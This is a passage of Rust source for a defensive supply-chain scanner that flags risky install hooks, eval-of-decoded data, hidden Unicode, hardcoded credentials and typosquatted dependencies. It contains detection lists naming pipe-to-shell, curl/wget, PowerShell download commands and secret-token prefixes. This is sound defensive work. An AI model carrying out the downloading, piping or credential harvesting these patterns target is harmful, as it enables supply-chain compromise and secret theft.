//! Supply-chain red flags.
//!
//! A quick, offline scan for patterns that often show up in malicious or
//! compromised repositories: install scripts that download and run code,
//! decoded strings passed to `eval`, executables checked in as source,
//! hidden Unicode that makes code read differently from how it runs,
//! hardcoded credentials and dependency names one typo away from a popular
//! package.
//!
//! The result is a list of things to review, not a safety verdict: clean
//! code can trip a check and a careful attacker can avoid all of them.
//! Each finding carries a severity (how bad it would be) and a confidence
//! (how likely it is a real problem rather than a false alarm). Findings in
//! tests, docs, examples, fixtures, vendored libraries and translations are
//! lowered one step on both, since that is not code the project's users run
//! or its authors wrote. Keys there are usually dummies, so they drop to low
//! confidence, and long or encoded data in tests, fixtures, vendored
//! libraries and translations is not reported at all.
//!
//! Files are only read, never executed, and nothing is sent over the network
//! unless dependency checking is asked for (see [`crate::vulns`]): then the
//! names and versions in lockfiles, and nothing else, go to osv.dev.
//! Secret values are never included in the output, only the kind of secret
//! and its line.

use crate::architecture::Confidence;
use crate::safe_text::sanitize;
use rayon::prelude::*;
use serde::Serialize;
use std::path::Path;

/// Most findings returned; the risk score still counts all of them.
pub const MAX_FINDINGS: usize = 200;
/// Most findings kept per file, so one generated file cannot fill the list.
const PER_FILE_LIMIT: usize = 20;
/// Lines at least this long are reported as minified or generated code.
const LONG_LINE: usize = 5_000;
/// Runs of base64 characters at least this long are reported as encoded blobs.
const BASE64_RUN: usize = 400;
/// Lines with at least this many `\x` escapes are reported as obfuscated.
const HEX_ESCAPES: usize = 40;
/// Longest package name shown in a finding.
const MAX_NAME: usize = 100;

pub const SECRET: &str = "secret";
pub const HIDDEN_UNICODE: &str = "hidden-unicode";
pub const INSTALL_SCRIPT: &str = "install-script";
pub const OBFUSCATION: &str = "obfuscation";
pub const BINARY: &str = "binary";
pub const MINIFIED: &str = "minified";
pub const TYPOSQUAT: &str = "typosquat";
pub const VULNERABLE_DEPENDENCY: &str = "vulnerable-dependency";

/// How much a finding matters.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn name(self) -> &'static str {
        match self {
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
        }
    }

    pub fn from_name(name: &str) -> Option<Severity> {
        match name {
            "low" => Some(Severity::Low),
            "medium" => Some(Severity::Medium),
            "high" => Some(Severity::High),
            _ => None,
        }
    }

    fn weight(self) -> u32 {
        match self {
            Severity::Low => 2,
            Severity::Medium => 10,
            Severity::High => 25,
        }
    }
}

/// One red flag.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Finding {
    pub severity: Severity,
    /// How likely the finding is a real problem rather than a false alarm.
    pub confidence: Confidence,
    /// Which check found it, e.g. `secret` or `install-script`.
    pub check: &'static str,
    /// Path relative to the audited folder.
    pub file: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    pub message: String,
    /// Set when the file is a test, doc, example or fixture, e.g. `test`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub context: Option<&'static str>,
}

/// What the audit does and does not tell you.
pub const NOTE: &str = "Red flags to review, not a safety verdict. The scan matches known patterns: clean code can trip a check, and code that passes is not proven safe. Findings in tests, docs, examples, fixtures, vendored libraries and translations are lowered one step. Secret values are never included; files are read, never run.";

/// All findings plus a summary score.
#[derive(Debug, Clone, Serialize)]
pub struct AuditReport {
    pub note: &'static str,
    pub files_scanned: usize,
    /// 0–100: high findings count 25, medium 10, low 2, capped at 100.
    pub risk_score: u32,
    /// The highest severity found, or `none`.
    pub risk_level: &'static str,
    /// Findings before the `MAX_FINDINGS` cap.
    pub total_findings: usize,
    /// `true` when findings were cut to `MAX_FINDINGS`.
    pub truncated: bool,
    /// Findings lowered because they are in tests, docs, examples or fixtures.
    pub lowered: usize,
    /// Set when dependencies were checked against OSV.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dependencies: Option<DependencySummary>,
    /// Set when a baseline was applied: the findings above are the new ones.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub baseline: Option<crate::baseline::Applied>,
    pub findings: Vec<Finding>,
}

/// What the dependency check covered.
#[derive(Debug, Clone, Serialize)]
pub struct DependencySummary {
    /// Distinct package versions checked.
    pub packages_checked: usize,
    /// Lockfiles read, relative to the audited folder.
    pub lockfiles: Vec<String>,
    /// Set when the vulnerability database could not be reached.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

impl AuditReport {
    /// Whether any finding is at or above `level`.
    pub fn has_at_least(&self, level: Severity) -> bool {
        self.findings.iter().any(|f| f.severity >= level)
    }
}

/// Audit every file under `root` that the scanner would read. When
/// `dependencies` is given, also check lockfile versions against that
/// vulnerability database.
pub fn audit(root: &Path, dependencies: Option<&dyn crate::vulns::Source>) -> AuditReport {
    scan(root, dependencies).report(None)
}

/// Every finding, before any baseline or cap.
pub struct Scan {
    pub files_scanned: usize,
    pub findings: Vec<Finding>,
    pub dependencies: Option<DependencySummary>,
}

impl Scan {
    /// The report, leaving out the findings `baseline` accepts.
    pub fn report(mut self, baseline: Option<&crate::baseline::Baseline>) -> AuditReport {
        let applied = baseline.map(|b| b.filter_audit(&mut self.findings));
        let mut report = finish(self.files_scanned, self.findings);
        report.dependencies = self.dependencies;
        report.baseline = applied;
        report
    }
}

/// Audit like [`audit`], keeping every finding so a baseline can be
/// applied or written.
pub fn scan(root: &Path, dependencies: Option<&dyn crate::vulns::Source>) -> Scan {
    let files = crate::scanner::scan_repository(root);
    let findings: Vec<Finding> = files
        .par_iter()
        .flat_map_iter(|path| {
            let Ok(bytes) = std::fs::read(path) else {
                return Vec::new();
            };
            let relative = path.strip_prefix(root).unwrap_or(path);
            let relative = sanitize(&relative.to_string_lossy().replace('\\', "/"));
            let mut found = audit_file(&relative, &bytes);
            let context = context_of(&relative);
            // Expected there: long lines in bundles and expected output,
            // encoded sample data, direction marks in Arabic or Hebrew text.
            if matches!(
                context,
                Some("test" | "fixture" | "vendored" | "translation")
            ) {
                found.retain(|f| !is_fixture_data(f));
            }
            found.truncate(PER_FILE_LIMIT);
            if let Some(context) = context {
                for f in &mut found {
                    lower(f, context);
                    // Keys outside the project's own code are almost always
                    // made up: for a test, or to show the format in docs.
                    if f.check == SECRET {
                        f.confidence = Confidence::Low;
                    }
                }
            }
            found
        })
        .collect();
    let mut findings = findings;
    let summary = dependencies.map(|source| {
        let check = crate::vulns::check(root, source);
        findings.extend(check.findings);
        DependencySummary {
            packages_checked: check.packages,
            lockfiles: check
                .lockfiles
                .iter()
                .map(|l| crate::analysis::dotted(l))
                .collect(),
            error: check.error,
        }
    });
    Scan {
        files_scanned: files.len(),
        findings,
        dependencies: summary,
    }
}

fn finish(files_scanned: usize, mut findings: Vec<Finding>) -> AuditReport {
    for f in &mut findings {
        f.file = crate::analysis::dotted(&f.file);
    }
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| b.confidence.cmp(&a.confidence))
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
            .then_with(|| a.check.cmp(b.check))
    });
    let risk_score = findings
        .iter()
        .map(|f| f.severity.weight())
        .sum::<u32>()
        .min(100);
    let risk_level = findings.first().map_or("none", |f| f.severity.name());
    let total_findings = findings.len();
    let lowered = findings.iter().filter(|f| f.context.is_some()).count();
    let truncated = total_findings > MAX_FINDINGS;
    findings.truncate(MAX_FINDINGS);
    AuditReport {
        note: NOTE,
        files_scanned,
        risk_score,
        risk_level,
        total_findings,
        truncated,
        lowered,
        dependencies: None,
        baseline: None,
        findings,
    }
}

fn finding(
    severity: Severity,
    check: &'static str,
    file: &str,
    line: Option<usize>,
    message: String,
) -> Finding {
    Finding {
        severity,
        confidence: base_confidence(check, severity),
        check,
        file: file.to_string(),
        line,
        message,
        context: None,
    }
}

/// How sure each kind of check is, before the file's context is considered.
fn base_confidence(check: &str, severity: Severity) -> Confidence {
    match (check, severity) {
        // Secrets match exact token formats and skip obvious placeholders.
        (SECRET, _) => Confidence::High,
        // Bidirectional controls have almost no business in source code.
        (HIDDEN_UNICODE, Severity::High) => Confidence::High,
        (HIDDEN_UNICODE, _) => Confidence::Medium,
        // Install hooks and build scripts that download things are often
        // legitimate (prebuilt binaries, native builds).
        (INSTALL_SCRIPT, Severity::Low) => Confidence::Low,
        (INSTALL_SCRIPT, _) => Confidence::Medium,
        (OBFUSCATION, Severity::Low) => Confidence::Low,
        (OBFUSCATION, _) => Confidence::Medium,
        (TYPOSQUAT, _) => Confidence::Medium,
        (VULNERABLE_DEPENDENCY, _) => Confidence::High,
        (BINARY, _) => Confidence::Medium,
        _ => Confidence::Low,
    }
}

/// Folders whose code users of the project do not run, or did not write:
/// copies of third-party code and translated text.
const LOWERED_DIRS: &[(&str, &str)] = &[
    ("test", "test"),
    ("tests", "test"),
    ("__tests__", "test"),
    ("__mocks__", "test"),
    ("spec", "test"),
    ("e2e", "test"),
    ("testdata", "fixture"),
    ("fixtures", "fixture"),
    ("fixture", "fixture"),
    ("docs", "docs"),
    ("doc", "docs"),
    ("examples", "example"),
    ("example", "example"),
    ("samples", "example"),
    ("sample", "example"),
    ("demo", "example"),
    ("demos", "example"),
    ("mock", "fixture"),
    ("mocks", "fixture"),
    ("mock-api", "fixture"),
    ("mock-data", "fixture"),
    ("__fixtures__", "fixture"),
    ("vendor", "vendored"),
    ("vendors", "vendored"),
    ("third_party", "vendored"),
    ("third-party", "vendored"),
    (".yarn", "vendored"),
    ("locales", "translation"),
    ("locale", "translation"),
    ("i18n", "translation"),
    ("l10n", "translation"),
    ("translations", "translation"),
];

/// `Some(kind)` when `file` is a test, doc, example, fixture, vendored
/// library or translation.
fn context_of(file: &str) -> Option<&'static str> {
    let lower = file.to_ascii_lowercase();
    let mut parts: Vec<&str> = lower.split('/').collect();
    let name = parts.pop().unwrap_or("");
    if let Some((_, kind)) = parts
        .iter()
        .find_map(|p| LOWERED_DIRS.iter().find(|(dir, _)| dir == p))
    {
        return Some(kind);
    }
    if crate::architecture::is_test(Path::new(file)) || name == "conftest.py" {
        return Some("test");
    }
    let ext = name.rsplit_once('.').map_or("", |(_, e)| e);
    if matches!(
        ext,
        "md" | "mdx" | "markdown" | "markdoc" | "rst" | "adoc" | "txt"
    ) && !name.starts_with("requirements")
    {
        return Some("docs");
    }
    if name.contains(".example") || name.contains(".sample") {
        return Some("example");
    }
    // Prebuilt copies of libraries: `jquery.min.js`, `swagger-ui-bundle.js`.
    if [".min.", "-min.", ".bundle.", "-bundle."]
        .iter()
        .any(|marker| name.contains(marker))
    {
        return Some("vendored");
    }
    None
}

/// Findings that tests and fixtures produce on purpose: long expected
/// output, encoded sample data and odd characters in sample files.
fn is_fixture_data(f: &Finding) -> bool {
    f.check == MINIFIED
        || (f.severity == Severity::Low && matches!(f.check, OBFUSCATION | HIDDEN_UNICODE))
}

/// Lower a finding one step on severity and confidence.
fn lower(f: &mut Finding, context: &'static str) {
    f.severity = match f.severity {
        Severity::High => Severity::Medium,
        _ => Severity::Low,
    };
    f.confidence = match f.confidence {
        Confidence::High => Confidence::Medium,
        _ => Confidence::Low,
    };
    f.context = Some(context);
}

/// Extensions treated as program source.
const CODE_EXTENSIONS: &[&str] = &[
    "js", "mjs", "cjs", "jsx", "ts", "mts", "cts", "tsx", "py", "rb", "php", "sh", "bash", "zsh",
    "ps1", "go", "rs", "pl", "lua", "java", "kt", "cs", "c", "cc", "cpp", "h", "hpp", "swift",
    "vue", "svelte",
];

/// Check one file. `file` is its sanitized relative path.
fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let name = file.rsplit('/').next().unwrap_or(file);
    let lower_name = name.to_ascii_lowercase();
    let ext = lower_name
        .rsplit_once('.')
        .map(|(_, e)| e.to_string())
        .unwrap_or_default();
    let code = CODE_EXTENSIONS.contains(&ext.as_str());

    if let Some(kind) = executable_kind(bytes) {
        out.push(finding(
            Severity::Medium,
            BINARY,
            file,
            None,
            format!("{kind} executable in the repository: it cannot be reviewed as source"),
        ));
        return out;
    }
    if bytes[..bytes.len().min(8_192)].contains(&0) {
        return out;
    }
    let text = String::from_utf8_lossy(bytes);

    let minified = lower_name.contains(".min.");
    // Minifiers produce `Function(`, `atob(`, hex escapes and long
    // strings, so these patterns say nothing about third-party bundles.
    let third_party = minified
        || lower_name.contains("-min.")
        || text.starts_with("/*!")
        || file
            .to_ascii_lowercase()
            .split('/')
            .any(|dir| VENDOR_DIRS.contains(&dir));
    let mut blob_reported = false;
    let mut long_line_reported = false;
    let lines: Vec<&str> = text.lines().collect();

    for (index, &line) in lines.iter().enumerate() {
        let n = Some(index + 1);

        if let Some(c) = line.chars().find(|c| is_bidi_control(*c)) {
            out.push(finding(
                if code { Severity::High } else { Severity::Low },
                HIDDEN_UNICODE,
                file,
                n,
                format!(
                    "Hidden bidirectional control U+{:04X}: text can display differently from how it is read by the compiler (Trojan Source)",
                    c as u32
                ),
            ));
        } else if code {
            let hidden = line
                .chars()
                .enumerate()
                .find(|&(col, c)| is_zero_width(c) && !(index == 0 && col == 0));
            if let Some((_, c)) = hidden {
                out.push(finding(
                    Severity::Medium,
                    HIDDEN_UNICODE,
                    file,
                    n,
                    format!(
                        "Invisible character U+{:04X}: two names that look the same can differ",
                        c as u32
                    ),
                ));
            }
        }

        let mut secret_on_line = false;
        for kind in find_secrets(line) {
            if kind == "private key" && !pem_has_body(line, lines.get(index + 1).copied()) {
                continue;
            }
            secret_on_line = true;
            if kind == "Google API key" && line.to_ascii_lowercase().contains("firebase") {
                let mut f = finding(
                    Severity::Low,
                    SECRET,
                    file,
                    n,
                    "Firebase web API key (value not shown). These ship to browsers by design; check that the project's rules restrict it.".to_string(),
                );
                f.confidence = Confidence::Low;
                out.push(f);
                continue;
            }
            out.push(finding(
                Severity::High,
                SECRET,
                file,
                n,
                format!("Possible {kind} (value not shown). Revoke it if it is real."),
            ));
        }

        if !code || third_party {
            if code && !long_line_reported && !minified && line.len() >= LONG_LINE {
                long_line_reported = true;
                out.push(long_line(file, n, line));
            }
            continue;
        }

        if EXEC_CALLS.iter().any(|t| line.contains(t)) && DECODERS.iter().any(|t| line.contains(t))
        {
            out.push(finding(
                Severity::High,
                OBFUSCATION,
                file,
                n,
                "Decodes data and runs it as code on the same line: a common way to hide what code does".to_string(),
            ));
        }

        let escapes = line.matches("\\x").count();
        if escapes >= HEX_ESCAPES {
            out.push(finding(
                Severity::Medium,
                OBFUSCATION,
                file,
                n,
                format!("String built from {escapes} hex escapes: its content is hidden"),
            ));
        }

        let mut blob_on_line = false;
        if !blob_reported && !secret_on_line {
            let run = longest_base64_run(line);
            if run.len() >= BASE64_RUN && !run.starts_with(WASM_BASE64) {
                let run = run.len();
                blob_reported = true;
                blob_on_line = true;
                out.push(finding(
                    Severity::Low,
                    OBFUSCATION,
                    file,
                    n,
                    format!("Encoded blob of {run} characters in source code"),
                ));
            }
        }

        if !long_line_reported && !blob_on_line && line.len() >= LONG_LINE && !is_number_data(line)
        {
            long_line_reported = true;
            out.push(long_line(file, n, line));
        }
    }

    match lower_name.as_str() {
        "package.json" => out.extend(package_json(file, &text)),
        "setup.py" => out.extend(setup_py(file, &text)),
        "build.rs" => out.extend(build_rs(file, &text)),
        _ if lower_name.starts_with("requirements") && ext == "txt" => {
            out.extend(requirements_txt(file, &text))
        }
        _ => {}
    }
    out
}

/// Folders that hold copies of other projects' code.
const VENDOR_DIRS: &[&str] = &[
    "vendor",
    "vendors",
    "third_party",
    "third-party",
    "thirdparty",
    "bower_components",
];

fn long_line(file: &str, line: Option<usize>, text: &str) -> Finding {
    finding(
        Severity::Low,
        MINIFIED,
        file,
        line,
        format!(
            "Line of {} characters: minified or generated code is hard to review",
            text.len()
        ),
    )
}

/// Mostly numbers, such as SVG path data or a lookup table.
fn is_number_data(line: &str) -> bool {
    let numeric = line
        .bytes()
        .filter(|b| {
            b.is_ascii_digit() || b.is_ascii_whitespace() || matches!(b, b'.' | b',' | b'-')
        })
        .count();
    numeric * 10 >= line.len() * 9
}

// ---------------------------------------------------------------------------
// Binaries
// ---------------------------------------------------------------------------

fn executable_kind(bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(b"\x7fELF") {
        return Some("Linux (ELF)");
    }
    const MACHO: &[[u8; 4]] = &[
        [0xFE, 0xED, 0xFA, 0xCE],
        [0xFE, 0xED, 0xFA, 0xCF],
        [0xCE, 0xFA, 0xED, 0xFE],
        [0xCF, 0xFA, 0xED, 0xFE],
    ];
    if MACHO.iter().any(|magic| bytes.starts_with(magic)) {
        return Some("macOS (Mach-O)");
    }
    if bytes.starts_with(b"MZ") && bytes.len() >= 0x40 {
        let offset = u32::from_le_bytes([bytes[0x3c], bytes[0x3d], bytes[0x3e], bytes[0x3f]]);
        let offset = offset as usize;
        if bytes.get(offset..offset.saturating_add(4)) == Some(b"PE\0\0".as_slice()) {
            return Some("Windows (PE)");
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Hidden Unicode
// ---------------------------------------------------------------------------

fn is_bidi_control(c: char) -> bool {
    matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}')
}

/// Invisible characters with no business in source code. Joiners (U+200C,
/// U+200D) are left out: emoji sequences and some scripts need them.
fn is_zero_width(c: char) -> bool {
    matches!(c, '\u{200B}' | '\u{2060}' | '\u{FEFF}' | '\u{180E}')
}

// ---------------------------------------------------------------------------
// Obfuscation
// ---------------------------------------------------------------------------

/// Calls that run a string as code.
const EXEC_CALLS: &[&str] = &["eval(", "exec(", "Function("];

/// Calls that decode a hidden string.
const DECODERS: &[&str] = &[
    "atob(",
    "b64decode(",
    "base64",
    "fromCharCode(",
    "unhexlify(",
    "codecs.decode(",
];

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_')
}

/// How a WebAssembly module (`\0asm` and a version) starts in base64.
/// Bundlers inline compiled modules this way.
const WASM_BASE64: &str = "AGFzbQ";

/// Longest run of base64 characters on the line, ignoring `data:` URIs,
/// which commonly embed small images and fonts.
fn longest_base64_run(line: &str) -> &str {
    if line.len() < BASE64_RUN || line.contains("data:") {
        return "";
    }
    let bytes = line.as_bytes();
    let (mut best, mut start) = (0..0, 0);
    for (i, &b) in bytes.iter().enumerate() {
        if !is_base64_byte(b) {
            start = i + 1;
        } else if i + 1 - start > best.len() {
            best = start..i + 1;
        }
    }
    &line[best]
}

// ---------------------------------------------------------------------------
// Secrets
// ---------------------------------------------------------------------------

struct SecretRule {
    kind: &'static str,
    prefix: &'static str,
    min: usize,
    max: usize,
    body: fn(u8) -> bool,
}

fn upper_or_digit(b: u8) -> bool {
    b.is_ascii_uppercase() || b.is_ascii_digit()
}

fn alnum(b: u8) -> bool {
    b.is_ascii_alphanumeric()
}

fn alnum_underscore(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

fn token_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_' || b == b'-'
}

#[rustfmt::skip]
const SECRET_RULES: &[SecretRule] = &[
    SecretRule { kind: "AWS access key ID", prefix: "AKIA", min: 16, max: 16, body: upper_or_digit },
    SecretRule { kind: "AWS access key ID", prefix: "ASIA", min: 16, max: 16, body: upper_or_digit },
    SecretRule { kind: "GitHub token", prefix: "ghp_", min: 36, max: 255, body: alnum },
    SecretRule { kind: "GitHub token", prefix: "gho_", min: 36, max: 255, body: alnum },
    SecretRule { kind: "GitHub token", prefix: "ghu_", min: 36, max: 255, body: alnum },
    SecretRule { kind: "GitHub token", prefix: "ghs_", min: 36, max: 255, body: alnum },
    SecretRule { kind: "GitHub token", prefix: "ghr_", min: 36, max: 255, body: alnum },
    SecretRule { kind: "GitHub token", prefix: "github_pat_", min: 22, max: 255, body: alnum_underscore },
    SecretRule { kind: "GitLab token", prefix: "glpat-", min: 20, max: 255, body: token_char },
    SecretRule { kind: "Slack token", prefix: "xoxb-", min: 10, max: 255, body: token_char },
    SecretRule { kind: "Slack token", prefix: "xoxp-", min: 10, max: 255, body: token_char },
    SecretRule { kind: "Slack token", prefix: "xoxa-", min: 10, max: 255, body: token_char },
    SecretRule { kind: "Slack token", prefix: "xoxr-", min: 10, max: 255, body: token_char },
    SecretRule { kind: "Slack token", prefix: "xoxs-", min: 10, max: 255, body: token_char },
    SecretRule { kind: "Stripe live key", prefix: "sk_live_", min: 20, max: 255, body: alnum },
    SecretRule { kind: "Stripe live key", prefix: "rk_live_", min: 20, max: 255, body: alnum },
    SecretRule { kind: "Google API key", prefix: "AIza", min: 35, max: 35, body: token_char },
    SecretRule { kind: "npm token", prefix: "npm_", min: 36, max: 36, body: alnum },
    SecretRule { kind: "PyPI token", prefix: "pypi-", min: 50, max: 255, body: token_char },
    SecretRule { kind: "OpenAI API key", prefix: "sk-proj-", min: 20, max: 255, body: token_char },
    SecretRule { kind: "Anthropic API key", prefix: "sk-ant-", min: 20, max: 255, body: token_char },
];

/// The opening and closing parts of a PEM private key header.
const PEM_BEGIN: &str = "-----BEGIN ";
const PEM_PRIVATE: &str = "PRIVATE KEY-----";

/// Kinds of secret that appear on the line. The values themselves are
/// never returned.
pub(crate) fn find_secrets(line: &str) -> Vec<&'static str> {
    let mut kinds: Vec<&'static str> = Vec::new();
    let bytes = line.as_bytes();
    for rule in SECRET_RULES {
        if kinds.contains(&rule.kind) {
            continue;
        }
        for (start, _) in line.match_indices(rule.prefix) {
            if start > 0 && token_char(bytes[start - 1]) {
                continue;
            }
            let body_start = start + rule.prefix.len();
            let body_len = bytes[body_start..]
                .iter()
                .take_while(|b| (rule.body)(**b))
                .count();
            if body_len < rule.min || body_len > rule.max {
                continue;
            }
            if is_placeholder(&line[body_start..body_start + body_len]) {
                continue;
            }
            kinds.push(rule.kind);
            break;
        }
    }
    if line.contains(PEM_BEGIN) && line.contains(PEM_PRIVATE) {
        kinds.push("private key");
    }
    kinds
}

/// Whether a private key header on `line` is followed by key material,
/// on the same line (after an escaped newline) or the next. Placeholders
/// such as `...`, `X` or a regex for the header have none.
fn pem_has_body(line: &str, next: Option<&str>) -> bool {
    const BODY: usize = 40;
    let run = |s: &str| {
        s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='))
            .map(str::len)
            .max()
            .unwrap_or(0)
    };
    let after = line
        .find(PEM_PRIVATE)
        .map_or("", |i| &line[i + PEM_PRIVATE.len()..])
        .replace("\\r", " ")
        .replace("\\n", " ");
    run(&after) >= BODY || next.is_some_and(|n| run(n) >= BODY)
}

/// Documentation examples and obvious dummies.
fn is_placeholder(body: &str) -> bool {
    let upper = body.to_ascii_uppercase();
    if upper.contains("EXAMPLE") || upper.contains("XXXX") || upper.contains("DUMMY") {
        return true;
    }
    let mut chars = body.chars();
    let first = chars.next();
    chars.all(|c| Some(c) == first)
}

// ---------------------------------------------------------------------------
// Install scripts
// ---------------------------------------------------------------------------

/// npm lifecycle scripts that run when the package is installed.
const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];

/// Commands in an install script that fetch or run hidden code.
const RISKY_COMMANDS: &[&str] = &[
    "curl ",
    "wget ",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
    "node -e",
    "eval ",
    "powershell",
    "Invoke-WebRequest",
    "http://",
    "https://",
    "base64",
];

fn package_json(file: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let Ok(json) = serde_json::from_str::<serde_json::Value>(text) else {
        return out;
    };

    // A private package is never installed as someone else's dependency,
    // so its plain install hooks only run for its own developers.
    let private = json.get("private").and_then(|p| p.as_bool()) == Some(true);
    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        for hook in INSTALL_HOOKS {
            let Some(command) = scripts.get(*hook).and_then(|c| c.as_str()) else {
                continue;
            };
            let line = line_of(text, &format!("\"{hook}\""));
            if let Some(risky) = RISKY_COMMANDS.iter().find(|t| command.contains(**t)) {
                out.push(finding(
                    Severity::High,
                    INSTALL_SCRIPT,
                    file,
                    line,
                    format!(
                        "\"{hook}\" script uses `{}`: it fetches or runs code when the package is installed",
                        risky.trim()
                    ),
                ));
            } else if *hook != "prepare" && !private {
                out.push(finding(
                    Severity::Low,
                    INSTALL_SCRIPT,
                    file,
                    line,
                    format!("\"{hook}\" script runs automatically when the package is installed"),
                ));
            }
        }
    }

    for section in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        let Some(deps) = json.get(section).and_then(|d| d.as_object()) else {
            continue;
        };
        for name in deps.keys() {
            if let Some(popular) = typosquat(name, NPM_POPULAR, false) {
                out.push(typosquat_finding(
                    file,
                    line_of(text, &format!("\"{name}\"")),
                    name,
                    popular,
                ));
            }
        }
    }
    out
}

/// Calls in `setup.py` that run commands or reach the network at install time.
const SETUP_PY_CALLS: &[&str] = &[
    "os.system(",
    "subprocess.",
    "urlopen(",
    "urllib.request",
    "requests.get(",
    "requests.post(",
    "socket.",
    "exec(",
    "eval(",
];

fn setup_py(file: &str, text: &str) -> Vec<Finding> {
    text.lines()
        .enumerate()
        .filter(|(_, line)| !line.trim_start().starts_with('#'))
        .filter_map(|(i, line)| {
            let call = SETUP_PY_CALLS.iter().find(|t| line.contains(**t))?;
            Some(finding(
                Severity::Medium,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                format!("setup.py calls `{call}`: this runs when the package is installed"),
            ))
        })
        .collect()
}

/// Signs that a Cargo build script reaches the network.
const BUILD_RS_NETWORK: &[&str] = &[
    "TcpStream",
    "reqwest",
    "ureq::",
    "curl",
    "wget",
    "http://",
    "https://",
];

fn build_rs(file: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut command_reported = false;
    for (i, line) in text.lines().enumerate() {
        if line.trim_start().starts_with("//") {
            continue;
        }
        if let Some(net) = BUILD_RS_NETWORK.iter().find(|t| line.contains(**t)) {
            out.push(finding(
                Severity::Medium,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                format!("build.rs mentions `{net}`: build scripts that download code run on every build"),
            ));
        } else if !command_reported && line.contains("Command::new(") {
            command_reported = true;
            out.push(finding(
                Severity::Low,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                "build.rs runs an external program at build time".to_string(),
            ));
        }
    }
    out
}

fn requirements_txt(file: &str, text: &str) -> Vec<Finding> {
    text.lines()
        .enumerate()
        .filter_map(|(i, line)| {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') || line.starts_with('-') {
                return None;
            }
            let end = line
                .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
                .unwrap_or(line.len());
            let name = &line[..end];
            let popular = typosquat(name, PYPI_POPULAR, true)?;
            Some(typosquat_finding(file, Some(i + 1), name, popular))
        })
        .collect()
}

fn line_of(text: &str, needle: &str) -> Option<usize> {
    text.lines().position(|l| l.contains(needle)).map(|i| i + 1)
}

// ---------------------------------------------------------------------------
// Typosquats
// ---------------------------------------------------------------------------

/// Widely used npm packages that attackers imitate.
#[rustfmt::skip]
const NPM_POPULAR: &[&str] = &[
    "react", "react-dom", "express", "lodash", "axios", "chalk", "commander", "moment", "webpack",
    "typescript", "eslint", "tslint", "prettier", "jquery", "redux", "dotenv", "mongoose",
    "nodemon", "socket.io", "body-parser", "jsonwebtoken", "bcrypt", "bcryptjs", "yargs",
    "inquirer", "colors", "color", "debug", "async", "request", "underscore", "rollup", "esbuild",
    "vitest", "mocha", "sinon", "cross-env", "rimraf", "minimist", "semver", "node-fetch",
    "puppeteer", "playwright", "sequelize", "prisma", "graphql", "tailwindcss", "postcss",
    "autoprefixer", "styled-components", "classnames", "electron", "discord.js", "ethers",
    "nodemailer", "dayjs", "date-fns", "cheerio", "babel-cli",
];

/// Widely used PyPI packages that attackers imitate.
#[rustfmt::skip]
const PYPI_POPULAR: &[&str] = &[
    "requests", "numpy", "pandas", "django", "flask", "fastapi", "pydantic", "sqlalchemy", "boto3",
    "botocore", "urllib3", "setuptools", "pytest", "scipy", "matplotlib", "pillow", "cryptography",
    "pyyaml", "jinja2", "celery", "redis", "psycopg2", "pymongo", "aiohttp", "httpx", "uvicorn",
    "gunicorn", "tensorflow", "torch", "transformers", "scikit-learn", "openai", "beautifulsoup4",
    "selenium", "paramiko", "click", "colorama", "tqdm", "python-dateutil", "attrs", "certifi",
    "charset-normalizer", "typing-extensions", "protobuf", "grpcio", "docker", "kubernetes",
    "jsonschema", "websockets", "pyjwt", "bcrypt", "psutil", "pycryptodome", "python-dotenv",
];

/// Real, unrelated packages that happen to be one edit from a popular name.
#[rustfmt::skip]
const KNOWN_NEIGHBOURS: &[&str] = &[
    "preact", "dotenvx", "torchx", "scapy", "jinja", "attr", "psycopg", "boto", "colord",
    "graphiql", "gaxios",
];

/// The popular package `name` is one edit away from, if it is not that
/// package itself. Python names compare case-, `_`- and `.`-insensitively.
fn typosquat(name: &str, popular: &[&'static str], python: bool) -> Option<&'static str> {
    let normalize = |s: &str| {
        let s = s.to_ascii_lowercase();
        if python {
            s.replace(['_', '.'], "-")
        } else {
            s
        }
    };
    let name = normalize(name);
    if name.chars().count() < 4
        || KNOWN_NEIGHBOURS.contains(&name.as_str())
        || popular.iter().any(|p| normalize(p) == name)
    {
        return None;
    }
    popular
        .iter()
        .copied()
        .filter(|p| p.len() >= 5)
        .find(|p| edit_distance(&name, &normalize(p)) == 1)
}

fn typosquat_finding(file: &str, line: Option<usize>, name: &str, popular: &str) -> Finding {
    let shown: String = sanitize(name).chars().take(MAX_NAME).collect();
    finding(
        Severity::Medium,
        TYPOSQUAT,
        file,
        line,
